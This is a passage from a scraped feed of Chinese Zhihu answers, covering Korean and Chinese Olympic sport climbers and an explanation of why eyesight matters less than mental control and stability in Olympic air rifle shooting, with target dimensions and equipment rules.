Kim技术动作丰富，攀爬节奏行云流水，脚点放置和手点抓握精准，无论从哪个角度来看都是教科书一般的存在，非常适合新手的学习。</p>\n<p>Jain和Akiyo同岁，在世界赛场上互相较量多年。早年Jain一直压制着Akiyo，直到近年来Akiyo开发出动态，以及世界比赛抱石定线风格越来越偏向跑酷风以后，Jain的风头才渐渐褪去。即便如此，在先锋攀登的比赛中，Jain仍然是稳定的决赛圈选手，并且还是可以力压群雄拿下冠军。只是Jain本身的风格并不动态，在现在的抱石比赛中非常吃亏，有的时候连半决赛都只能勉强进入，所以一定程度拖累了综合成绩。</p>\n<p>Jain也有奥运梦想，在年度积分上没有优势的她，决定冲击一下2020年亚洲锦标赛，因为2020年亚洲锦标赛的冠军还是可以获得一个奥运名额。然而造化弄人，因为新冠疫情，2020年亚洲锦标赛不得不取消，由于时间紧急，世界攀联选择了顺沿积分最高的选手递补，Jain遗憾无缘奥运。可喜的是，Jain在奥运希望破灭之后选择了和自己结婚多年的老公要了一个孩子，今年刚刚出生，一家人共享天伦之乐。笔者还是真诚地希望以后能在国际赛场上见到Jain，但是如果Jain就此退役，对她的人生也未必不是一件好事。</p>\n<p>有趣的是，世界攀联顺沿递补的一男一女两个奥运名额，都落在了韩国选手的囊中——男选手是Jong-won Chon，女选手则是Chae-hyun Seo。</p>\n<p>Chae-hyun Seo今年才十七岁，刚出道时被誉为韩国天才少女，而且她从小是看着Jain的比赛长大的，并且拥有一个叫“小Jain Kim”的外号。两人是忘年之交，也经常一起训练，Jain甚至也在第一时间把自己怀孕的消息跟Chae-hyun分享。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5f884e7e75c1af6486c4bd8b66dfe225_720w.jpg?rss\" data-caption=\"Chae-hyun Seo在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"457\" data-watermark=\"watermark\" data-original-src=\"v2-5f884e7e75c1af6486c4bd8b66dfe225\" data-watermark-src=\"v2-be9623cc33efa79c1c2492a22d9ae051\" data-private-watermark-src=\"v2-d592125a0e64349ae65ea672445d1513\"></p>\n<p>Chae-hyun在十四岁的时候拿下了户外5.14d（科罗拉多州的Bad Girls Club）的好成绩，震惊了全世界。在2019年刚刚适龄参加世界攀联锦标赛，就在六次先锋攀登比赛中拿下4金1银1铜的好成绩，力压Janja成为年度的先锋攀登冠军。Chae-hyun和Jain Kim技术风格类似，在抱石比赛中也没有很大优势，想要真正称霸世界还有一段路要走。</p>\n<p>另一名值得一提的韩国选手是男队的Jong-won Chon，同样也获得了奥运名额。相比其他精英男选手，Jong-won Chon本身非常偏瘦，BMI值甚至只有17点几，是营养不良的标准。但是Jong-won Chon最大的优势在于指力强劲，并且在2015年和2017年都拿到过抱石的年度总冠军，近年来也都是抱石比赛决赛圈的常客。笔者深刻怀疑Jong-won属于怎么吃都吃不胖的体型，因为他声称自己最爱吃的就是汉堡，并且称汉堡为“强者的食物”。奥运赛场上，Jong-won的竞争对手有很多，除开两位日本选手以外，捷克之王Adam Ondra无疑也是最大威胁。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-501e5729fef8ba657458d6aa3589a35b_720w.jpg?rss\" data-caption=\"Jong-won Chong在比赛中。可以看出，他的身材非常精瘦。图源：Gettyimages\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"904\" data-watermark=\"watermark\" data-original-src=\"v2-501e5729fef8ba657458d6aa3589a35b\" data-watermark-src=\"v2-36e39e004bc245fad2ab3753fca0c917\" data-private-watermark-src=\"v2-390070b72bf892baa945234c2c7fe5fd\"></p>\n<p>相比韩国女队，韩国男队的后备力量要相对薄弱一些，在韩国全国比赛中，只要Jong-won不打盹，抱石冠军绝对没跑，先锋决赛也是毫无悬念。在培养后继巨星方面，韩国男队还需要努力。</p>\n<p><b>中国队</b></p>\n<p><b>关键词：希望</b></p>\n<p>相比日本和韩国两国，中国队目前的实力无疑是比较薄弱的。这个情况跟往前四五十年的中国围棋情况非常相似：中国向日韩努力学习，尤其日本。</p>\n<p>抱石目前是中国队在国际赛场上最需要提高的一项。和日本队以及韩国队选手经常是世界攀联锦标赛决赛的常客不同，中国队的队员往往需要在预选赛中超水平发挥才可以进入半决赛，然而在半决赛中往往也处于后半梯队，很难争取到一个决赛名额。</p>\n<p>先锋攀登方面，中国队要好一些。攀岩入奥以后，国家开始重视，开始有意培养攀岩选手，攀岩也在人民群众中开始普及，作为地大物博的国家自然有天才少年出现。中国选手在先锋攀登的世界攀联锦标赛中，已经能比较稳定地锁定半决赛名额，而且也能经常在决赛看到我们中国选手的身影。</p>\n<p>下面这个表格是2019年世界攀联锦标赛先锋攀登比赛各个分站赛的决赛成员，包含男女组。其中的两位中国选手我用红色标记出来了。这里日本队仍然是绿色，韩国队使用蓝青色，我们可以再次看到日本队可怕的统治力，以及2019年韩国天才少女Chae-hyun在先锋攀登中的优异表现：</p>\n<p>IFSC Lead Finalist in 2019 - Men &amp; Women </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c9ff3c27111d54fcda4a678b8659eb0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1105\" data-rawheight=\"587\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在表格里面出现的这两位中国选手，就是我们国家自己的两位天才少年：潘愚非和张悦彤。其中，潘愚非成功拿到了奥运资格，张悦彤由于在预选赛后期遭遇伤病以及新冠疫情改制等原因无缘这次奥运。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4be21644e4af673c6b9d5976a9761aec_720w.jpg?rss\" data-caption=\"潘愚非在比赛中。\" data-size=\"normal\" data-rawwidth=\"1153\" data-rawheight=\"1729\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运选手：潘愚非</p>\n<p>笔者有一位在华南理工上大学的朋友。他在大学期间接触了攀岩，而且学校里就有攀岩馆，氛围非常好。而在攀岩馆内，爬得最好的并不是华南理工校队的成员，而是一位十岁的孩子——这位孩子，就是现在的潘愚非。</p>\n<p>潘愚非开始训练攀岩的理由，其实跟许多岩友有着相似之处。潘愚非从小体质弱，而且并不是很喜欢具有激烈身体对抗的体育活动，因此选择了攀岩。攀岩从来不是岩者跟岩者之间的较量，而永远是岩者跟岩壁之间的较量。潘愚非不断精进自己，改进自己的攀爬技术，补全自己的短板。</p>\n<p>在2017年的国际攀联锦标赛厦门站中，潘愚非就获得了男子先锋攀登的第三名，这是中国队第一次在先锋攀登站上领奖台。而在上图的2019年的国际攀联锦标赛Villars站中，潘愚非更是再一次取得了突破，获得了男子先锋攀登的第二名，并且锁定了一张奥运会入场券。这次奥运因为疫情延期，使得他更有机会能够继续锤炼自己，以求能在奥运赛场上取得更大的突破。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7f7444793dd9a63e0e8d20bc2f900390_720w.jpg?rss\" data-caption=\"张悦彤在比赛中。\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运遗珠：张悦彤</p>\n<p>如果说韩国拥有自己的天才少女Chae-hyun Seo的话，那么我们中国也有自己的天才少女，张悦彤（彤彤）。</p>\n<p>彤彤在深圳出生长大，从小就开始学习攀岩。在2012年开始参加全国青年攀岩锦标赛，就拿下该年龄段的先锋和速度冠军，并且完成四连霸。尽管在国内已经战绩显赫，但是彤彤在2018年才真正站到国际赛场，参加了国际攀联世界青年锦标赛，在16-17岁组获得了抱石比赛第五名，先锋攀登第三名的好成绩，可谓是出道就是高起点，相比Chae-hyu那也不遑多让。接着在2019年彤彤就开始参加了成年组的比赛取得了一次亚军，一次第六名，和一次第七名的好成绩。尽管目前在成绩上相比韩国天才选手Chae-hyun，以及日本小将Natsuki Tanii稍逊，但是未来的路还很长，彤彤的前景也很光明，我们完全有理由相信这三位选手在未来在亚洲和世界赛场上大放异彩，成为中日韩女子攀岩界的一时瑜亮。很有趣的是，这三位女孩子的私交也非常好，可以看到Instagram上她们经常的互相留言点赞。相信随着未来越来越多的世界攀联比赛以及奥运比赛，我们能更多地看到她们一起出现在国际赛场上。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3bb4a10e3c0bcfaa668edd335cf19e08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"597\" data-watermark=\"watermark\" data-original-src=\"v2-3bb4a10e3c0bcfaa668edd335cf19e08\" data-watermark-src=\"v2-3bd063b675312b8de5584fd4c8ff130b\" data-private-watermark-src=\"v2-7966abfc730a45b1d2b76f847d889f62\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-04a1bf0e8229b642e44aa87c76b4e74d_720w.jpg?rss\" data-caption=\"分别是Chae-hyun和彤彤在2019年国际攀联世界杯Briancon站之后的社交媒体截图。两位小姑娘私底下是很好的朋友，经常在社交媒体互动。\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"599\" data-watermark=\"watermark\" data-original-src=\"v2-04a1bf0e8229b642e44aa87c76b4e74d\" data-watermark-src=\"v2-65825b16f90050585a2daa6e71bdba23\" data-private-watermark-src=\"v2-6e9ccb69962552faf569044c35272581\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liang-wei-93-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梁维</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">152 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265963316?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问滑板,滑雪跟冲浪这3种运动在学习或者滑行时有什么共同点跟不同点呢？</a><br><a href=\"http://www.zhihu.com/question/20535362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">冲浪运动有哪些需要注意的地方？</a><br>\n","link":"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"奥运神射手许海峰视力不足 0.5，张梦圆近视 600 度，近视也可以练射击吗？他们是如何看清靶子的？","date":"2021-08-04 06:30:10","description":"\n<p>对于射击运动来说，<b>视力远没有多数人想象的那么重要</b>。</p>\n<p>普通人无法看清的靶纸，<b>很多射击运动员同样无法看清</b>。</p>\n<p><br></p>\n<p>因为一来靶纸那么小、距离那么远，已经超过人类视力的极限。最后的结果是，大家都看的不是很清……二来即便存在“千里眼”看得清清楚楚，如果无法做到动作稳定、且心态平静的完成射击，依然无法实现目标。</p>\n<p>毕竟射击向来比的不是谁看的最准，甚至不是比谁射击的技术，而是<b>比谁心理更沉着，动作更「稳」。</b></p>\n<p>——所以射击选手花了大量的时间，都用来训练抗压能力/心理负荷和稳定性。包括所有射击项目用到的道具，射击服、射击鞋等，主要的作用也都是提高稳定性、降低干扰。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c643d3516909f50d1d150d0d3f109ff5_720w.jpg?rss\" data-rawwidth=\"2070\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"面部肌肉颤抖对气步枪射击而言是很要命的\" data-watermark=\"watermark\" data-original-src=\"v2-c643d3516909f50d1d150d0d3f109ff5\" data-watermark-src=\"v2-d22620a066be6bef3d56c20526e96c41\" data-private-watermark-src=\"v2-7912020596079aa8a2371c85c99c22ba\"></p>\n<p><br></p>\n<p>之前和射击队的聊过，其中两点记忆犹新。</p>\n<p>打气步枪射击的，别管平时表情多么搞怪面部动作丰富，射击时<b>控制面部肌肉颤抖的能力</b>相当重要（实际上很多身体的细微动作并不受主观控制，这是与生俱来的天赋）；</p>\n<p>另外别看射击运动员比赛中每个动作那么稳、甚至视觉上动作表现的很程序化很僵化，其实他们的身体动作非常柔和（笨重的射击服也限制了活动），射击运动员在所有奥运运动员里，可能具备最强的<b>姿势模仿能力</b>。</p>\n<p>这个姿势模仿能力，也是选拔潜力小射击运动员的重要标准之一。</p>\n<hr>\n<p>多放一些射击相关的设备和数据，对视力和射击这件事理解就能直观很多。</p>\n<p>也就能明白为什么说，<b>视力其实压根不是决定最终成绩的关键因素。</b></p>\n<p><br></p>\n<p>奥运射击分为两类，固定靶射击（气步枪、气手枪）和飞碟移动靶射击（双管霰弹枪）。固定靶射击里最短距离10米，固定射击位+固定靶纸。</p>\n<p>找了三张十米气步枪比赛的照片，注意距离十米远的靶纸上的黑点（很小）：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a61f8162d4b1bd096dc7942c67860ab5_720w.jpg?rss\" data-rawwidth=\"2068\" data-rawheight=\"1378\" data-size=\"normal\" data-caption=\"今年东京奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a61f8162d4b1bd096dc7942c67860ab5\" data-watermark-src=\"v2-04076c7997de43b7adac7cb13d7977ca\" data-private-watermark-src=\"v2-7885c1609907d9fbbc2c27fa1da5f846\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a4cb5aa17f6632d222c705317c8f7265_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1704\" data-size=\"normal\" data-caption=\"2016年里约奥运的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a4cb5aa17f6632d222c705317c8f7265\" data-watermark-src=\"v2-3c02bed2538609bbf8e492d3681331c5\" data-private-watermark-src=\"v2-5f89e586b5334924063012f4185f2d8d\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9cac32d063d8374716ffab1c95267511_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1549\" data-size=\"normal\" data-caption=\"2000年悉尼奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-9cac32d063d8374716ffab1c95267511\" data-watermark-src=\"v2-8469af387e0691cf35d4df11e2d637b8\" data-private-watermark-src=\"v2-7c6c8ebe760527eea40a0e92334fe7a0\"></p>\n<p><br></p>\n<p>照片里几乎看不清的黑点，长这样：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-eaf94c752fa453778bc1987930996d2c_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eaf94c752fa453778bc1987930996d2c\" data-watermark-src=\"v2-8a2619bc981a92ee5f9f28bf32242672\" data-private-watermark-src=\"v2-a679d212cca1a4df698389a272e42f22\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4175a56120392ec9877508723ef3af55_720w.jpg?rss\" data-rawwidth=\"1552\" data-rawheight=\"1076\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4175a56120392ec9877508723ef3af55\" data-watermark-src=\"v2-56b2fc38e9976aea65b0218e84a5226c\" data-private-watermark-src=\"v2-0256b89d60a6d5af0f2c05725943228c\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-40b7fe38af87ce013d3e0e91788901fa_720w.jpg?rss\" data-rawwidth=\"1286\" data-rawheight=\"316\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40b7fe38af87ce013d3e0e91788901fa\" data-watermark-src=\"v2-cf37a8b562b4c4b203cbadafbb293093\" data-private-watermark-src=\"v2-6d8832082ddd19bedcbfd10c7c91d51e\"></p>\n<p>具体尺寸为：</p>\n<blockquote>总直径= 45.5mm； <br>4 环直径=30.5mm；<br>9 环直径=5.5mm； <br>10 环Ø=0.5mm；<br>划线宽度0.1mm至0.2mm</blockquote>\n<p><br></p>\n<p>就这么点大，且那么远。</p>\n<p><b>想要看清靶纸上的7～10环区，对人类的视觉而言几乎就已经是不可能的任务。</b></p>\n<p><b>而想靠眼睛去区分更细微的、能决定选手成绩的*.*环，更是完全天方夜谭。</b></p>\n<p>如果普通人有机会尝试一下10米气步枪射击，能打中靶纸，已经是相当不错的结果了。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-940b24ca888bd0b71925a8532d7c7a31_720w.jpg?rss\" data-rawwidth=\"1442\" data-rawheight=\"964\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-940b24ca888bd0b71925a8532d7c7a31\" data-watermark-src=\"v2-a0f9ebfc3f065605f3c0d5fa133b0cd0\" data-private-watermark-src=\"v2-63d079f33da8abcce3f15b691eec14ac\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2de532b30c98113a4747581ff6aad381_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"这张仅供参考尺寸\" data-watermark=\"watermark\" data-original-src=\"v2-2de532b30c98113a4747581ff6aad381\" data-watermark-src=\"v2-ebb5e1269be41afeba9df52198af1c70\" data-private-watermark-src=\"v2-ce53ad360730d4edb0d7eb7f783a7a40\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-12f29d42fea4a50e6ffa1eff3e3f24a6_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"和奥运会使用的靶纸较为类似的装置。通过滚轴更换单次射击的靶纸。\" data-watermark=\"watermark\" data-original-src=\"v2-12f29d42fea4a50e6ffa1eff3e3f24a6\" data-watermark-src=\"v2-fcd2d8ae4234b037679cf38d7c50174c\" data-private-watermark-src=\"v2-0b8fbb17806fdc12eda7ffb7aef8f44b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c918094ff8d050c877ffcd3f5c60dd8_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"932\" data-size=\"normal\" data-caption=\"相比之下，气手枪的靶纸就要比气步枪大得多。二者在射击器材、射击方式的精准性和稳定性上也有明显的差异\" data-watermark=\"watermark\" data-original-src=\"v2-4c918094ff8d050c877ffcd3f5c60dd8\" data-watermark-src=\"v2-7414622bcfa55c90c2b069f95cfda240\" data-private-watermark-src=\"v2-394c3ad916878ab9576b3d1413fa80a0\"></p>\n<p><br></p>\n<p>今年东京奥运会首金杨倩，女子十米气步枪，杨倩的最后一枪只有9.8环，发挥失常，她自己打完可能都以为冠军没戏了，然而俄罗斯的阿纳斯塔西娅·加拉希娜更是很失误的打了8.9环。最后一枪决出了胜负。</p>\n<p>杨倩：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-80e7e69eb62cae639ebbff4b94b3ef02_720w.jpg?rss\" data-rawwidth=\"1924\" data-rawheight=\"1014\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-80e7e69eb62cae639ebbff4b94b3ef02\" data-watermark-src=\"v2-91d717f99b06b47dd296b66129e4b9af\" data-private-watermark-src=\"v2-fd8ac62e4b3acfc5c111ebad8bb246d1\"></p>\n<p><br></p>\n<p>加拉希娜：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-227d2e5d4cae9e943493edfb1ba2084c_720w.jpg?rss\" data-rawwidth=\"1922\" data-rawheight=\"1026\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227d2e5d4cae9e943493edfb1ba2084c\" data-watermark-src=\"v2-f78e6f0a839bec800f4ce2eb795b7c2b\" data-private-watermark-src=\"v2-82b7c4c73680d5fca423ce4df88477ea\"></p>\n<p><br></p>\n<p>结合10米这个距离、这个小黑点，想象一下对她们而言大失水准的9.8环、8.9环，是什么概念。它们和各自最高的10.9环，位移的差异，又是怎样一个毫米数值。</p>\n<p>——<b>人类的视觉，精度完全没法达到这个水准。</b></p>\n<p>这种情况下，<b>视力度数的差异，影响也就没那么大了。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f1528de1e6d0c05c876c86a6368d4424_720w.jpg?rss\" data-rawwidth=\"700\" data-rawheight=\"467\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f1528de1e6d0c05c876c86a6368d4424\" data-watermark-src=\"v2-6895316fe5dab70083838d6a063a6a89\" data-private-watermark-src=\"v2-52f7b16b73412f8f182b84f3f8d8e55f\"></p>\n<p><br></p>\n<p>所以开头才说，视力无法成为决定最终射击成绩关键因素，<b>心理负荷的调节能力</b>和<b>技术动作的稳定性</b>，才是最最最重要的。</p>\n<p>很多人提到杨倩，都知道她是00后，最近还在热议她颁奖时的比心动作、美甲图案、清华学生身份……这个2000年7月出生的姑娘，2011年已经开始射击训练、2012年就参加比赛了。</p>\n<p>这整整十年的专业训练中，心理一直是需要伴随技术同步训练的内容。集中的志趣定向、超强的自控力、坚忍的意志品质、进取心……缺一不可。</p>\n<p>区别其他项目，射击运动员往往要更荣辱不惊一些，尤其是在参加大赛的多个项目中，不管第一项是夺冠还是失败，都要求选手能尽量恢复到平常心的状态进入另一项——就这种能力的考验而言，整个奥运会项目中也很难找到第二个了。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6dadc2607e9cea38ddec2d870cb72ea6_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"1025\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6dadc2607e9cea38ddec2d870cb72ea6\" data-watermark-src=\"v2-43070ecdf793747cb5d1ffe9062e7d68\" data-private-watermark-src=\"v2-360575c880d0f6d3b0fd6bfd26172d1b\"></p>\n<p><br></p>\n<p>如今奥运会采用的淘汰制（得分最低者陆续被淘汰，最后冠亚军直接PK对决）在比赛观赏性上显然更紧张刺激，对选手的心理考验是极高的。</p>\n<p>因此，射击届也有一个默认的说法，<b>高手之间的竞争往往不是技术的竞争，而是一场无烟的心理战争。</b></p>\n<p><br></p>\n<p>技术动作的稳定性方面，射击选手也会进行大量的体能训练、力量训练。看起来“毫无训练痕迹”的射击运动员，他们在核心肌群的稳定性方面，要远超于普通人。</p>\n<p>关于稳定性有一个非常经典的测试（普通人也可以尝试一下）：</p>\n<p><b>光脚站在平整地面，单脚站立，另一只脚叠放脚背上或悬空，双臂平伸，闭上双眼，然后开始计时——普通人往往在20-60秒间，就无法保持平衡了。</b></p>\n<p>而杜丽之前曾透露过，<b>职业射击运动员能站数分钟甚至十几分钟。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac4c268082a1dbe8930b06391d3d58ba_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"同为十米气步枪选手，2004年拿到雅典奥运会首金的杜丽，如今已是2020年东京奥运会首金杨倩的教练之一\" data-watermark=\"watermark\" data-original-src=\"v2-ac4c268082a1dbe8930b06391d3d58ba\" data-watermark-src=\"v2-9503f92f82b8569d146e9a06b6f395a7\" data-private-watermark-src=\"v2-2f5508e617c5e708dfaf68dd396afc2c\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ea534331a69079cd508510e5fa4e3bec_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"869\" data-size=\"normal\" data-caption=\"东京夺金后，庞伟的金牌数量也追平妻子杜丽。而庞伟从身型上看，也许也更接近普通人，属于“毫无训练痕迹”的那类。但他们的稳定性及心理素质，则远高于一般人\" data-watermark=\"watermark\" data-original-src=\"v2-ea534331a69079cd508510e5fa4e3bec\" data-watermark-src=\"v2-2676bc9b6a21e63f656e728456f249c1\" data-private-watermark-src=\"v2-4aefb4704a58519f87910e3d46893764\"></p>\n<p><br></p>\n<p>所以心理负荷的控制能力、技术动作和身体的稳定能力，这些都要远远比视力重要。</p>\n<p>和普通人视力水平相似的射击选手之所以做到机器般的精准度，用卖油翁的话来说，</p>\n<p>“无它，唯手熟尔。”</p>\n<hr>\n<p>最后多提一下气步枪射击的装备——</p>\n<p><br></p>\n<p>因为射击器械、射击姿势的不同，气手枪和气步枪的装备差异极大。</p>\n<p>气手枪往往穿着较为舒适、日常运动的服装即可，也不允许借助外界装备来提高射击时的稳定性。而气步枪则全副武装、如同戴了一副盔甲一样：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e4ea6eb5560e511a356b3558519b261_720w.jpg?rss\" data-rawwidth=\"1199\" data-rawheight=\"820\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4ea6eb5560e511a356b3558519b261\" data-watermark-src=\"v2-9ccddc00b2cf6ca8783129292865bdce\" data-private-watermark-src=\"v2-0a5285fd59918eefa14727c3b2932cb8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f36277de0652d5801ffa10c472bd20ff_720w.jpg?rss\" data-rawwidth=\"2158\" data-rawheight=\"1216\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f36277de0652d5801ffa10c472bd20ff\" data-watermark-src=\"v2-a86080cb9806ed90c35f56b2e020eba4\" data-private-watermark-src=\"v2-110569dc2dcce28b75abd2149a0a3680\"></p>\n<p><br></p>\n<p>气步枪的射击服，用盔甲形容真不为过。一般用料包括两层厚帆布外加皮革，因此过去的射击服，重量和厚度都相当的惊人，5+公斤是常态。2004年雅典奥运会后，世界射击联合会（issf）对装备有过调整，稍微轻薄了一些。</p>\n<p>专业选手的射击服都是量身定做、专人专制的，<b>整个测量的繁琐程度，远超过很多高级定制西装的规格。</b></p>\n<p>非职业射击训练者，采购专业射击服时如果无法像职业选手那样测量，也需要填写相当繁琐的身体数据，最终的射击服才能勉强一用。</p>\n<p>——就算两个选手身高体重一样，看起来粗粗大大的射击服依然不能换着穿。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9d1ddd68ec017ff6b15eb4df07cf773a_720w.gif?rss\" data-rawwidth=\"555\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9d1ddd68ec017ff6b15eb4df07cf773a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>射击服的所有功能设计，也为达到射击过程中<b>完美的稳定性</b>，以及<b>尽可能杜绝一切外界的、选手自身的干扰</b>，并且<b>对颈椎、腰背等部位起到保护和预防慢性伤病</b>的作用。</p>\n<p>其中选手自身的干扰，就包括因为心脏跳动引起的、和呼吸起伏时身体出现的晃动——结合上面射击成绩和靶纸尺寸，想象一下心跳、呼吸等日常毫无存在感的生理动作，都会极大影响射击的精准度。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8f2115d5f6c2b5aaaa7635cc12dda9bd_720w.jpg?rss\" data-rawwidth=\"2074\" data-rawheight=\"1392\" data-size=\"normal\" data-caption=\"与视觉上的粗矿不同，实际射击服对细节精度、功能要求都极高，是技术含量很高的专业定制化装备\" data-watermark=\"watermark\" data-original-src=\"v2-8f2115d5f6c2b5aaaa7635cc12dda9bd\" data-watermark-src=\"v2-6208fe7e4ff1cf415820fd14efae0c60\" data-private-watermark-src=\"v2-7c64117af74e7817d86c51592dec1192\"></p>\n<p><br></p>\n<p>但本质上，射击又会避免装备带来的稳定性额外加成，所以对装备依然有条条框框的检测标准。</p>\n<p>比如射击鞋。</p>\n<p>在站姿射击中，站立的稳定性、鞋底的防滑性无疑是很重要的。<b>假设选手穿着完全无法曲折、也毫无缓震性的中底，显然稳定性就能达到最大——issf就杜绝了这种情况。</b></p>\n<p>它要求射击鞋“必须是可弯曲的”。专门有个测试射击鞋的器械，要求<b>15牛顿米的力施加到中底时，鞋底必须达到至少22.5°的弯曲。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ef6a31cde5087face3793b46a4baba79_720w.jpg?rss\" data-rawwidth=\"2072\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"专业射击用鞋在中底厚度、鞋帮高度等都有严格要求，因为都可能会增加射击时的额外稳定性\" data-watermark=\"watermark\" data-original-src=\"v2-ef6a31cde5087face3793b46a4baba79\" data-watermark-src=\"v2-9915911ea4f747e5296fcd7ca077cc55\" data-private-watermark-src=\"v2-7db8aeafbba433d1c8909a44c8ec50ec\"></p>\n<p><br></p>\n<p>因而，射击服、射击鞋等一方面为了这项运动的单个选手量身定制，尽可能满足稳定性的需要，一方面又不能成为提升精准度、左右成绩的额外加成。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" 